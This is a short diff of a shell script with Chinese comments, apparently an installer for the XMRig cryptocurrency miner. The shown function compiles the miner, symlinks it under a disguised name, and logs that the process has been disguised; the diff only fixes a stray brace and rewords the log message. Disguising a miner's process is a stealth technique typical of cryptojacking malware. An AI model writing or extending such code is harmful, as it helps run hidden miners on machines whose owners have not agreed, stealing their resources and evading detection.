@@ -745,12 +745,11 @@ compile_from_source() {
     
     # 创建软链接保持兼容性
     ln -sf "$disguise_name" xmrig
-}
     
     # 更新全局变量
     DISGUISE_NAME="$disguise_name"
     
-    log_info "XMRig安装完成，进程已伪装为: $DISGUISE_NAME"
+    log_info "XMRig编译和安装完成，进程已伪装为: $DISGUISE_NAME"
 }
 
 # 创建配置文件
